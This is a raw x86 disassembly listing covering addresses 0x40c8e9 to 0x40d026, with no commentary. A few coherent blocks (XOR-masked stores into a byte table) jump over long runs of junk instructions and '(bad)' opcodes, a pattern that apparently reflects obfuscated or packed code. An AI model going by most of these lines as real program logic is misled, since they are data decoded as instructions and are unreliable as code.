  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	mov    esp,DWORD PTR [eax]
  40c925:	jnp    0x40c922
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c8d3
  40c930:	mov    ecx,0xced6c085
  40c935:	xchg   BYTE PTR [ecx-0x11],ch
  40c938:	dec    eax
  40c939:	sti    
  40c93a:	mov    bl,0xc
  40c93c:	jo     0x40c991
  40c93e:	fmul   QWORD PTR [eax-0x749992e9]
  40c944:	sub    BYTE PTR [ebp-0x4e],0xd8
  40c948:	sub    eax,0x84eb4c67
  40c94d:	scas   eax,DWORD PTR es:[edi]
  40c94e:	loope  0x40c98c
  40c950:	pop    esp
  40c951:	mov    eax,0xedd2c6e5
  40c956:	sub    cl,BYTE PTR [ecx+0x476f5ac7]
  40c95c:	add    al,0xde
  40c95e:	shr    DWORD PTR [edi+esi*8-0x78163f33],1
  40c965:	sub    DWORD PTR [ebx-0x33],0xcdf1b02f
  40c96c:	or     esi,DWORD PTR [edx-0x4a]
  40c96f:	cmp    bh,BYTE PTR [ebx]
  40c971:	xchg   ebp,eax
  40c972:	inc    ebx
  40c973:	xor    dh,BYTE PTR [edi+edx*4+0x74f09cdd]
  40c97a:	or     al,0xd7
  40c97c:	jne    0x40c906
  40c97e:	stos   DWORD PTR es:[edi],eax
  40c97f:	sar    DWORD PTR [edi],1
  40c981:	test   BYTE PTR [eax+0x47],0x51
  40c985:	inc    edx
  40c986:	push   es
  40c987:	icebp  
  40c988:	fs adc eax,0x4d6872dd
  40c98e:	(bad)  
  40c98f:	out    0xef,eax
  40c991:	fldenv [esi+0xa3d0e1b]
  40c997:	jb     0x40c9ef
  40c999:	arpl   di,cx
  40c99b:	mov    ds,ebx
  40c99d:	addr16 jns 0x40c989
  40c9a0:	in     eax,0x20
  40c9a2:	clc    
  40c9a3:	inc    esi
  40c9a4:	stos   BYTE PTR es:[edi],al
  40c9a5:	lock lods eax,DWORD PTR ds:[esi]
  40c9a7:	cmc    
  40c9a8:	mov    edi,DWORD PTR [edx+0x34]
  40c9ab:	mov    esp,0x3b14834a
  40c9b0:	cs daa 
  40c9b2:	cmp    DWORD PTR [eax-0xec607a4],edi
  40c9b8:	sbb    al,0x7f
  40c9ba:	mov    al,0x74
  40c9bc:	mov    BYTE PTR [ebx+ebx*4-0x80],al
  40c9c0:	mov    cl,0x94
  40c9c2:	fwait
  40c9c3:	cli    
  40c9c4:	popa   
  40c9c5:	das    
  40c9c6:	or     edi,DWORD PTR [eax]
  40c9c8:	int3   
  40c9c9:	js     0x40c9a9
  40c9cb:	stos   DWORD PTR es:[edi],eax
  40c9cc:	mov    ebx,0x8c05aec8
  40c9d1:	pushf  
  40c9d2:	leave  
  40c9d3:	mov    ebx,0x389f2ad0
  40c9d8:	pop    eax
  40c9d9:	cmp    BYTE PTR [ebp+0x75],cl
  40c9dc:	pop    es
  40c9dd:	inc    esi
  40c9de:	aad    0xc6
  40c9e0:	jb     0x40ca24
  40c9e2:	mov    ds:0x5a1d13e6,eax
  40c9e7:	out    dx,al
  40c9e8:	xchg   ebp,eax
  40c9e9:	add    edi,DWORD PTR [edi+0x5c0133b1]
  40c9ef:	daa    
  40c9f0:	xchg   ebx,eax
  40c9f1:	test   eax,0x79ddbe8b
  40c9f6:	shr    DWORD PTR [edi],1
  40c9f8:	out    dx,eax
  40c9f9:	pop    ebp
  40c9fa:	pushf  
  40c9fb:	psrad  mm7,QWORD PTR [edx+0xc]
  40c9ff:	xchg   ecx,eax
  40ca01:	adc    al,0xbb
  40ca04:	xchg   ebx,eax
  40ca05:	mov    edi,0xa2d617fc
  40ca0a:	enter  0xf65e,0x67
  40ca0e:	paddsb mm6,QWORD PTR [ebx]
  40ca11:	inc    ecx
  40ca12:	fwait
  40ca13:	jmp    0xe47b:0x2ca3c2a1
  40ca1a:	test   DWORD PTR [ecx-0x39c5eb28],esp
  40ca20:	imul   edi,DWORD PTR [esp+ebp*4-0x2a],0x25
  40ca25:	ret    0xe3fd
  40ca28:	and    ah,bh
  40ca2a:	jmp    0x40ca5c
  40ca2c:	ins    BYTE PTR es:[edi],dx
  40ca2d:	test   DWORD PTR [edx+0x7c],ebx
  40ca30:	mov    eax,DWORD PTR [esp+ebp*2]
  40ca33:	inc    ecx
  40ca34:	(bad)  
  40ca35:	rol    BYTE PTR [eax],1
  40ca37:	jae    0x40ca30
  40ca39:	loop   0x40ca17
  40ca3b:	jecxz  0x40c9e4
  40ca3d:	lahf   
  40ca3e:	sbb    BYTE PTR [edx-0x6bae6d45],dl
  40ca44:	scas   al,BYTE PTR es:[edi]
  40ca45:	mov    eax,DWORD PTR [ecx+eiz*2+0x3ba7c965]
  40ca4c:	xchg   esi,eax
  40ca4d:	pop    edi
  40ca4e:	jnp    0x40cabe
  40ca50:	call   DWORD PTR [eax]
  40ca52:	jp     0x40c9f4
  40ca54:	mov    es,eax
  40ca56:	mov    dl,0xf5
  40ca58:	cmp    eax,0xb28b234c
  40ca5d:	or     esi,DWORD PTR [ecx+edx*8-0x657af757]
  40ca64:	in     al,dx
  40ca65:	and    BYTE PTR [edi-0x44],ch
  40ca68:	or     BYTE PTR [edi+0x5eda7624],bl
  40ca6e:	(bad)  
  40ca6f:	mov    ecx,DWORD PTR [eax-0x5]
  40ca72:	inc    ebp
  40ca73:	std    
  40ca74:	dec    edi
  40ca75:	jae    0x40cac3
  40ca77:	retf   
  40ca78:	int3   
  40ca79:	test   BYTE PTR [bx],dh
  40ca7c:	xchg   edi,eax
  40ca7d:	aad    0x51
  40ca7f:	sbb    ebx,eax
  40ca81:	adc    al,0x2a
  40ca83:	jmp    0x40cace
  40ca85:	in     eax,dx
  40ca86:	cmp    eax,DWORD PTR [ebx-0x63db4aca]
  40ca8c:	pop    ss
  40ca8d:	arpl   WORD PTR [edx+ebp*2],bx
  40ca90:	sub    DWORD PTR [edi],ebx
  40ca92:	xchg   DWORD PTR [eax-0xe],esi
  40ca95:	cmp    BYTE PTR [ebx-0x5c],0x8b
  40ca99:	out    0xa1,eax
  40ca9b:	(bad)  
  40ca9c:	aad    0xbb
  40ca9e:	in     eax,0xfd
  40caa0:	jge    0x40ca88
  40caa2:	(bad)  
  40caa3:	rcl    dh,cl
  40caa5:	mov    esp,DWORD PTR [esi]
  40caa7:	push   ss
  40caa8:	or     esp,DWORD PTR [esi+0x68]
  40caab:	sub    BYTE PTR [edx],ah
  40caad:	add    eax,DWORD PTR [eax-0x6e]
  40cab0:	dec    ebx
  40cab1:	pop    ecx
  40cab2:	dec    edx
  40cab3:	pop    esp
  40cab4:	dec    esi
  40cab5:	mov    DWORD PTR [edi+0x59],ebp
  40cab8:	lahf   
  40cab9:	in     al,dx
  40caba:	dec    eax
  40cabb:	cwde   
  40cabc:	ret    0x7623
  40cabf:	fimul  WORD PTR [esi-0x44ea02e8]
  40cac5:	adc    eax,0xd5f22dcc
  40caca:	push   0xb4ffda62
  40cacf:	mov    ah,0x34
  40cad1:	sbb    al,0x92
  40cad3:	adc    ebx,ebp
  40cad5:	lods   eax,DWORD PTR ds:[esi]
  40cad6:	mov    ds:0xc17b96c9,eax
  40cadb:	ss repnz fs stc 
  40cadf:	fwait
  40cae0:	and    DWORD PTR [ebx+0xf],eax
  40cae3:	ds inc ebx
  40cae5:	nop
  40cae6:	test   BYTE PTR [esi+eiz*8-0x6cfcdd2],dl
  40caed:	jmp    0x6323a7b4
  40caf2:	inc    ebp
  40caf3:	jmp    0x3:0xfe552637
  40cafa:	jmp    0x40cb2e
  40cafc:	test   DWORD PTR [ebx-0x41],edx
  40caff:	jb     0x40cae4
  40cb01:	ds cmp al,0x66
  40cb04:	adc    eax,0x8abd7bcc
  40cb09:	in     eax,dx
  40cb0a:	pop    ebp
  40cb0b:	xor    esp,DWORD PTR gs:[eax-0x7]
  40cb0f:	cli    
  40cb10:	ror    DWORD PTR [edx+0x7dce62ef],1
  40cb16:	cmp    BYTE PTR [eax+eax*1],0x44
  40cb1a:	std    
  40cb1b:	das    
  40cb1c:	cdq    
  40cb1d:	frstor ds:0xdb5f5ffe
  40cb23:	not    DWORD PTR [eax-0x11]
  40cb26:	and    al,ah
  40cb28:	dec    ecx
  40cb29:	xor    eax,0x7c17f754
  40cb2e:	stos   DWORD PTR es:[edi],eax
  40cb2f:	(bad)  
  40cb30:	jmp    0x8288a351
  40cb35:	fcomp  QWORD PTR [eax]
  40cb37:	cmp    DWORD PTR [esi],esp
  40cb39:	lods   al,BYTE PTR ds:[esi]
  40cb3a:	fsubr  DWORD PTR [esi+ebx*4+0x18]
  40cb3e:	paddd  mm2,mm4
  40cb41:	and    eax,0x8c8e5343
  40cb46:	retf   0x7df4
  40cb49:	jl     0x40cb61
  40cb4b:	jo     0x40cb4a
  40cb4d:	fidiv  DWORD PTR [ebx]
  40cb4f:	leave  
  40cb50:	pop    es
  40cb51:	adc    al,0xae
  40cb53:	sub    al,0xeb
  40cb55:	adc    al,0xfa
  40cb57:	test   BYTE PTR ds:0x64c35e70,0x86
  40cb5e:	xchg   esi,eax
  40cb5f:	jnp    0x40cae6
  40cb61:	and    DWORD PTR [edi+edx*2-0x42],0x87ae2248
  40cb69:	jge    0x40cb2a
  40cb6b:	leave  
  40cb6c:	dec    ecx
  40cb6d:	mov    ebx,0xbfb1a022
  40cb72:	adc    al,0x6
  40cb74:	push   0x486f7c6d
  40cb79:	xchg   esp,eax
  40cb7a:	and    BYTE PTR [eax-0xf],cl
  40cb7d:	and    edi,esp
  40cb7f:	push   esi
  40cb80:	rcl    DWORD PTR [edx+0x32],0x54
  40cb84:	les    edx,FWORD PTR [ecx]
  40cb86:	fist   WORD PTR ds:0x328a365d
  40cb8c:	int3   
  40cb8d:	and    BYTE PTR [eax-0x1b0be129],0x25
  40cb94:	retf   0x60f9
  40cb97:	cmc    
  40cb98:	xchg   DWORD PTR [edx],eax
  40cb9a:	and    eax,0x4505297c
  40cb9f:	popf   
  40cba0:	and    edx,DWORD PTR [ecx+ebp*8-0x3036880d]
  40cba7:	mov    edi,es
  40cba9:	or     esp,DWORD PTR [edx]
  40cbab:	or     al,0x2a
  40cbad:	imul   edx,DWORD PTR [ebx+0x27],0x28
  40cbb1:	push   edx
  40cbb2:	cli    
  40cbb3:	mov    dh,0x64
  40cbb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb6:	pop    edi
  40cbb7:	mov    dh,bh
  40cbb9:	jmp    0x40cb4a
  40cbbb:	add    BYTE PTR [edx],cl
  40cbbd:	sti    
  40cbbe:	adc    DWORD PTR [esp+edx*8-0x27],0x5c
  40cbc3:	in     al,dx
  40cbc4:	xchg   edi,eax
  40cbc5:	lods   eax,DWORD PTR ds:[esi]
  40cbc6:	fstp   QWORD PTR [edx-0xb27f159]
  40cbcc:	or     eax,0x3afeab7a
  40cbd1:	js     0x40cc00
  40cbd3:	(bad)  
  40cbd4:	paddq  mm1,QWORD PTR [ecx-0x4f]
  40cbd8:	push   0xffffffab
  40cbda:	jmp    0xbcdb:0xb5028210
  40cbe1:	test   al,0xa8
  40cbe3:	(bad)  
  40cbe5:	pop    ss
  40cbe6:	mov    ds:0x74cc4360,eax
  40cbeb:	inc    edx
  40cbec:	dec    edi
  40cbed:	jp     0x40cc5c
  40cbef:	aaa    
  40cbf0:	jb     0x40cbd6
  40cbf2:	fwait
  40cbf3:	rcr    edx,0xa1
  40cbf6:	dec    edi
  40cbf7:	aad    0xba
  40cbf9:	jno    0x40cbc5
  40cbfb:	nop
  40cbfc:	mul    al
  40cbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbff:	mov    BYTE PTR [ebp-0x8bf6925],bl
  40cc05:	pop    esp
  40cc06:	sbb    ebp,ebp
  40cc08:	fldenv [ebp-0x35]
  40cc0b:	dec    eax
  40cc0c:	in     eax,dx
  40cc0d:	mov    esi,0x4ba95d8e
  40cc12:	ja     0x40cc0e
  40cc14:	sub    BYTE PTR [ecx+0x782dcbf2],al
  40cc1a:	rol    ebx,cl
  40cc1c:	mov    al,0x27
  40cc1e:	ret    0x51ad
  40cc21:	xor    ch,bh
  40cc23:	dec    esi
  40cc24:	loopne 0x40cbc5
  40cc26:	lods   al,BYTE PTR ds:[esi]
  40cc27:	fst    DWORD PTR [ecx-0x3fa45925]
  40cc2d:	sbb    edx,DWORD PTR [edi-0x26f5f07e]
  40cc33:	call   0x10ad95a1
  40cc38:	cld    
  40cc39:	(bad)  
  40cc3a:	xchg   ebx,eax
  40cc3b:	in     eax,0xd
  40cc3d:	data16 aam 0x22
  40cc40:	mov    DWORD PTR [ebx+edx*4-0x226f0d8f],edx
  40cc47:	dec    ebp
  40cc48:	push   0xffffffd3
  40cc4a:	(bad)  
  40cc4b:	out    0x82,al
  40cc4d:	inc    eax
  40cc4e:	xlat   BYTE PTR ds:[ebx]
  40cc4f:	out    0x4,eax
  40cc51:	cs addr16 jnp 0x40cc1a
  40cc55:	enter  0x35ce,0xca
  40cc59:	or     ebp,DWORD PTR [ebx]
  40cc5b:	adc    ebp,DWORD PTR [edi]
  40cc5d:	or     edx,DWORD PTR [ebp+edx*8+0x5]
  40cc61:	dec    edx
  40cc62:	mov    ah,0x4
  40cc64:	add    BYTE PTR [edx-0x14],cl
  40cc67:	cmp    edi,edx
  40cc69:	sbb    ah,BYTE PTR [ecx+0x64]
  40cc6c:	sbb    al,0xa1
  40cc6e:	fist   WORD PTR [ebx-0x571fb89b]
  40cc74:	sub    eax,0xeb2d0375
  40cc79:	add    eax,0xa5e4c7a9
  40cc7e:	jns    0x40cc10
  40cc80:	pushf  
  40cc81:	mov    eax,ds:0x333a8d4
  40cc86:	rol    DWORD PTR [ebx],1
  40cc88:	stc    
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	int    0xae
  40cca8:	pop    eax
  40cca9:	ret    
  40ccaa:	cmp    edx,DWORD PTR [edx+0x79ca7c7c]
  40ccb0:	jl     0x40cd2e
  40ccb2:	or     dl,bl
  40ccb4:	inc    ecx
  40ccb5:	sub    dl,ah
  40ccb7:	xchg   edx,eax
  40ccb8:	ret    0x270a
  40ccbb:	dec    eax
  40ccbc:	pop    ebp
  40ccbd:	shr    DWORD PTR [eax],1
  40ccbf:	hlt    
  40ccc0:	push   ss
  40ccc1:	neg    BYTE PTR [ebx]
  40ccc3:	aaa    
  40ccc4:	leave  
  40ccc5:	cmp    al,0x43
  40ccc7:	dec    edx
  40ccc8:	sahf   
  40ccc9:	mov    edx,0xc7240db6
  40ccce:	mov    eax,0xe9ae2b52
  40ccd3:	push   cs
  40ccd4:	lea    edi,[ebp+0x5a]
  40ccd7:	xchg   edx,eax
  40ccd8:	inc    edx
  40ccd9:	dec    edx
  40ccda:	cld    
  40ccdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccdc:	daa    
  40ccdd:	cmp    dh,BYTE PTR [edx-0x74]
  40cce0:	mov    edx,0x8bb919d1
  40cce5:	or     DWORD PTR [eax+0x3d],eax
  40cce8:	lock mov BYTE PTR [esi-0x42],cl
  40ccec:	fnstenv [ecx+0x4]
  40ccef:	outs   dx,BYTE PTR ds:[esi]
  40ccf0:	lods   al,BYTE PTR ds:[esi]
  40ccf1:	sbb    dl,ah
  40ccf3:	ficomp DWORD PTR [edx]
  40ccf5:	inc    edi
  40ccf6:	inc    ebp
  40ccf7:	nop
  40ccf8:	dec    ebp
  40ccf9:	lods   eax,DWORD PTR ds:[esi]
  40ccfa:	inc    esi
  40ccfb:	stos   BYTE PTR es:[edi],al
  40ccfc:	dec    ebp
  40ccfd:	(bad)  
  40ccfe:	mov    cl,0xb8
  40cd00:	popf   
  40cd01:	mov    BYTE PTR [ecx-0xf],al
  40cd04:	add    DWORD PTR [eax],edi
  40cd06:	out    0xe8,eax
  40cd08:	or     eax,0x11b62842
  40cd0d:	(bad)  
  40cd0e:	and    dl,BYTE PTR ds:0x220816e
  40cd14:	or     esi,DWORD PTR [ebp-0xf621aa9]
  40cd1a:	mov    bh,0x9
  40cd1c:	pop    esp
  40cd1d:	rcr    DWORD PTR [ebx-0x7f],cl
  40cd20:	dec    eax
  40cd21:	lahf   
  40cd22:	shl    DWORD PTR [ebx-0x31f91799],1
  40cd28:	gs leave 
  40cd2a:	push   ebx
  40cd2b:	(bad)  
  40cd2c:	mov    dh,0xe4
  40cd2e:	fadd   QWORD PTR [esi+0x459aa0df]
  40cd34:	mov    ah,0x9a
  40cd36:	inc    esp
  40cd37:	inc    esi
  40cd38:	mov    ah,0x90
  40cd3a:	add    ebx,DWORD PTR [esi]
  40cd3c:	out    dx,eax
  40cd3d:	into   
  40cd3e:	outs   dx,BYTE PTR ds:[esi]
  40cd3f:	leave  
  40cd40:	psadbw mm5,QWORD PTR [ebp+0x67]
  40cd44:	test   al,0x9
  40cd46:	ins    DWORD PTR es:[edi],dx
  40cd47:	scas   eax,DWORD PTR es:[edi]
  40cd48:	cmp    edx,ebx
  40cd4a:	pop    ds
  40cd4b:	xchg   BYTE PTR [ebp-0x22],ch
  40cd4e:	(bad)
  40cd52:	pop    edi
  40cd53:	xchg   edi,eax
  40cd54:	or     bl,0x6c
  40cd57:	int    0x56
  40cd59:	les    ebp,FWORD PTR [ebx]
  40cd5b:	cmp    eax,0x775b5d22
  40cd60:	fwait
  40cd61:	retf   0x8522
  40cd64:	stc    
  40cd65:	pop    eax
  40cd66:	mov    edi,0x685ea743
  40cd6b:	dec    ecx
  40cd6c:	jge    0x40cdb5
  40cd6e:	icebp  
  40cd6f:	fst    DWORD PTR ds:0x9e5d27c5
  40cd75:	mov    eax,ds:0x710e5e81
  40cd7a:	sub    al,al
  40cd7c:	stc    
  40cd7d:	or     eax,0xc484528a
  40cd82:	mov    DWORD PTR [eax+0x3bee9078],eax
  40cd88:	cdq    
  40cd89:	xchg   ecx,eax
  40cd8a:	jns    0x40cdc8
  40cd8c:	sbb    eax,0x35503fff
  40cd91:	push   eax
  40cd92:	jo     0x40cdaf
  40cd94:	xlat   BYTE PTR ds:[ebx]
  40cd95:	shl    DWORD PTR [esi+ebp*1+0x5e],0xa0
  40cd9a:	dec    esi
  40cd9b:	dec    ebx
  40cd9c:	or     dh,BYTE PTR [edi]
  40cd9e:	pop    eax
  40cd9f:	sbb    DWORD PTR [edx-0x5d],esi
  40cda2:	in     eax,0x5b
  40cda4:	mov    al,0x99
  40cda6:	cmp    DWORD PTR [edi+0x9],ebx
  40cda9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdaa:	add    eax,0x89e3024b
  40cdaf:	mov    eax,ebx
  40cdb1:	and    DWORD PTR [edx+ebx*4-0x5d5bb3db],0xfefa6920
  40cdbc:	and    eax,0x6fe0d2c4
  40cdc1:	(bad)  
  40cdc2:	or     edi,DWORD PTR [eax+ecx*2-0x4a]
  40cdc6:	fnstenv [eax]
  40cdc8:	xchg   DWORD PTR [esi-0x4b7db269],ecx
  40cdce:	sub    ch,BYTE PTR ds:0xb35583ec
  40cdd4:	jl     0x40cde6
  40cdd6:	cmp    ch,dl
  40cdd8:	hlt    
  40cdd9:	add    BYTE PTR [esp+eax*1+0x6b],ah
  40cddd:	add    eax,0x87b9589a
  40cde2:	cmp    eax,0x85338e06
  40cde7:	jle    0x40ce67
  40cde9:	adc    BYTE PTR ds:0x5fb1a301,0xb2
  40cdf0:	xchg   ebx,eax
  40cdf1:	mov    cl,0xa2
  40cdf3:	in     al,0x0
  40cdf5:	gs cmp al,0xa8
  40cdf8:	das    
  40cdf9:	sbb    DWORD PTR [ebp-0x58dc4314],0x17332890
  40ce03:	mov    ebp,0xf25456b1
  40ce08:	rcl    ch,0x9a
  40ce0b:	enter  0x8ea7,0xcf
  40ce0f:	push   ebx
  40ce10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce11:	dec    eax
  40ce12:	idiv   DWORD PTR [edi-0x57]
  40ce15:	push   0x1a607785
  40ce1a:	call   0x715d:0xd9250e2b
  40ce21:	mov    ch,0xa
  40ce23:	jl     0x40cdb3
  40ce25:	adc    ch,BYTE PTR [ecx]
  40ce27:	or     al,0x68
  40ce29:	gs call 0xe293db02
  40ce2f:	xor    BYTE PTR [ebx+0x4d],0x27
  40ce33:	add    bh,BYTE PTR [ebp-0x7bb0d9a6]
  40ce39:	push   ss
  40ce3a:	sbb    al,0x99
  40ce3c:	imul   edx,DWORD PTR ds:0x6adadeee,0x7
  40ce43:	xor    eax,0x2765c70f
  40ce48:	in     eax,0x5c
  40ce4a:	pop    ds
  40ce4b:	sbb    BYTE PTR [eax-0x20],dh
  40ce4e:	push   ebx
  40ce4f:	retf   0x701d
  40ce52:	mov    esi,0x8379d1f2
  40ce57:	dec    ebp
  40ce58:	pushf  
  40ce59:	sar    DWORD PTR [eax+0x8],1
  40ce5c:	iret   
  40ce5d:	aad    0xe1
  40ce5f:	xchg   ecx,eax
  40ce60:	enter  0xff1f,0xaf
  40ce64:	out    dx,eax
  40ce65:	fidivr WORD PTR [edx-0x2bae4c96]
  40ce6b:	out    0xfb,eax
  40ce6d:	mov    bh,0x23
  40ce6f:	enter  0xc232,0x71
  40ce73:	xchg   ecx,edx
  40ce75:	push   edi
  40ce76:	pushf  
  40ce77:	mov    bl,BYTE PTR [eax+0x1fddfd1e]
  40ce7d:	popf   
  40ce7e:	je     0x40ce2e
  40ce80:	jo     0x40ce85
  40ce82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce83:	(bad)
  40ce87:	(bad)  
  40ce88:	dec    ebx
  40ce89:	or     al,0x9b
  40ce8b:	xchg   DWORD PTR [eax+edx*2],edx
  40ce8e:	xor    eax,0xead1fec2
  40ce93:	mov    esi,0x7de4903b
  40ce98:	call   0x2848c767
  40ce9d:	sti    
  40ce9e:	xor    eax,0xd842571c
  40cea3:	std    
  40cea4:	push   cs
  40cea5:	int3   
  40cea6:	outs   dx,BYTE PTR ds:[esi]
  40cea7:	pop    ss
  40cea8:	repnz test eax,0xa8d600a3
  40ceae:	inc    BYTE PTR [ecx-0x17]
  40ceb1:	lahf   
  40ceb2:	dec    ebp
  40ceb3:	pusha  
  40ceb4:	es xchg ecx,eax
  40ceb6:	(bad)  
  40ceb7:	addr16 push cs
  40ceb9:	sub    edi,esi
  40cebb:	mov    esp,0xdcbb82aa
  40cec0:	pop    eax
  40cec1:	xchg   ebp,eax
  40cec2:	xchg   edi,eax
  40cec3:	outs   dx,BYTE PTR ds:[esi]
  40cec4:	aaa    
  40cec5:	push   cs
  40cec6:	and    BYTE PTR [ecx+0x2f],0xad
  40ceca:	fdivr  st(5),st
  40cecc:	repz dec esp
  40cece:	ror    DWORD PTR [ebx+esi*4],cl
  40ced1:	add    al,bl
  40ced3:	gs xor al,0xcc
  40ced6:	ret    
  40ced7:	aad    0xff
  40ced9:	push   0xffffffa0
  40cedb:	mov    DWORD PTR [ecx-0x4b9b92a8],esp
  40cee1:	clc    
  40cee2:	nop
  40cee3:	xor    BYTE PTR [ebx+0x53],bh
  40cee6:	mov    eax,0x16cfab01
  40ceeb:	jo     0x40cea1
  40ceed:	shufps xmm4,xmm7,0x8d
  40cef1:	lock ret 0x788b
  40cef5:	pop    ebx
  40cef6:	xchg   ebx,eax
  40cef7:	adc    eax,0x463b0c3f
  40cefc:	test   DWORD PTR [edx+0x6e],esp
  40ceff:	lods   al,BYTE PTR ds:[esi]
  40cf00:	inc    edx
  40cf01:	pop    edx
  40cf02:	pop    ebp
  40cf03:	(bad)  
  40cf05:	test   BYTE PTR [edi],ah
  40cf07:	lahf   
  40cf08:	xchg   edi,eax
  40cf09:	inc    esp
  40cf0a:	mov    ah,0x57
  40cf0c:	mov    dh,BYTE PTR [ebp+0x5e]
  40cf0f:	jo     0x40ce9c
  40cf11:	nop
  40cf12:	test   al,0x93
  40cf14:	inc    ebp
  40cf15:	inc    esi
  40cf17:	stos   BYTE PTR es:[edi],al
  40cf18:	jmp    0x8d7d:0xe47fa516
  40cf1f:	and    DWORD PTR [edi+0xcd7bbf9],ebp
  40cf25:	mov    ds:0xa4609dad,eax
  40cf2a:	out    dx,eax
  40cf2b:	fwait
  40cf2c:	cmp    al,0x91
  40cf2e:	inc    DWORD PTR [edx+0x7f]
  40cf31:	lods   eax,DWORD PTR ds:[esi]
  40cf32:	cmp    edi,DWORD PTR [ebx+0x1199e079]
  40cf38:	mov    ebx,0xfc88d5de
  40cf3d:	jp     0x40cf09
  40cf3f:	sbb    al,0xe5
  40cf41:	xchg   edi,eax
  40cf42:	(bad)  
  40cf43:	hlt    
  40cf44:	(bad)  
  40cf45:	adc    DWORD PTR [ebx],edi
  40cf47:	int3   
  40cf48:	stos   DWORD PTR es:[edi],eax
  40cf49:	or     BYTE PTR [eax+0x29],dl
  40cf4c:	push   es
  40cf4d:	cli    
  40cf4e:	in     al,0x69
  40cf50:	cmp    eax,0xa429b26f
  40cf55:	loop   0x40cf8b
  40cf57:	sub    BYTE PTR [edx+0x21],bl
  40cf5a:	mov    al,BYTE PTR [edx]
  40cf5c:	sub    BYTE PTR [ebp-0x12],dh
  40cf5f:	mov    dl,0x97
  40cf61:	popf   
  40cf62:	jge    0x40cf07
  40cf64:	fpatan 
  40cf66:	mov    ebp,0x95aa184c
  40cf6b:	out    dx,al
  40cf6c:	cmp    al,0x53
  40cf6e:	cmp    eax,0x7b780e33
  40cf73:	enter  0xfd04,0xb5
  40cf77:	xor    BYTE PTR [edi+edx*8-0x33],bh
  40cf7b:	or     esi,ebx
  40cf7d:	cmc    
  40cf7e:	stos   DWORD PTR es:[edi],eax
  40cf7f:	rcr    BYTE PTR [ebp+0x67],cl
  40cf82:	fstp   TBYTE PTR [esi-0x6b]
  40cf85:	cmp    edi,ecx
  40cf87:	fstp   QWORD PTR ds:0xd789a162
  40cf8d:	xor    edi,edi
  40cf8f:	ja     0x40cffd
  40cf91:	ret    0x66a4
  40cf94:	push   esp
  40cf95:	sub    DWORD PTR ds:0x7cedc4d9,edi
  40cf9b:	dec    edx
  40cf9c:	dec    esi
  40cf9d:	push   edi
  40cf9e:	lahf   
  40cf9f:	out    dx,eax
  40cfa0:	push   edx
  40cfa1:	adc    DWORD PTR [ebx+0x2596da8d],esi
  40cfa7:	inc    eax
  40cfa8:	dec    ebx
  40cfa9:	(bad)  
  40cfaa:	stc    
  40cfab:	or     eax,DWORD PTR [ecx+0x78336d0]
  40cfb1:	das    
  40cfb2:	in     al,dx
  40cfb3:	dec    esp
  40cfb4:	mov    BYTE PTR [ebx+edx*8],ch
  40cfb7:	pop    ds
  40cfb8:	dec    edx
  40cfb9:	and    al,0x8f
  40cfbb:	lahf   
  40cfbc:	sbb    BYTE PTR [esi-0x6e],dl
  40cfbf:	clc    
  40cfc0:	(bad)  
  40cfc2:	sub    eax,0x958c55c9
  40cfc7:	mov    DWORD PTR [ebx+0x7b850194],ecx
  40cfcd:	sbb    edi,ecx
  40cfcf:	cmp    eax,0x53ebdfcb
  40cfd4:	mov    edx,DWORD PTR [ebx]
  40cfd6:	scas   al,BYTE PTR es:[edi]
  40cfd7:	pop    edi
  40cfd8:	cmp    dl,BYTE PTR [ebx+0x5e]
  40cfdb:	fs mov dh,0x47
  40cfde:	(bad)  
  40cfe0:	lods   al,BYTE PTR ds:[esi]
  40cfe1:	ret    0xae0f
  40cfe4:	mov    ebx,0xcddd8644
  40cfe9:	loop   0x40d005
  40cfeb:	mov    ecx,0xffa274f7
  40cff0:	std    
  40cff1:	jae    0x40cfb7
  40cff3:	test   DWORD PTR [eax-0x4b7dce6d],edi
  40cff9:	(bad)  
  40cffa:	lahf   
  40cffb:	popf   
  40cffc:	(bad)  
  40cffd:	int    0xa
  40cfff:	cld    
  40d000:	adc    al,0x7b
  40d002:	ins    BYTE PTR es:[edi],dx
  40d003:	(bad)  
  40d004:	mov    eax,ds:0x8b9f2104
  40d009:	jge    0x40cfe7
  40d00b:	xor    edx,eax
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	scas   eax,DWORD PTR es:[edi]
  40d024:	(bad)  
  40d026:	push   0x7c7c9f91
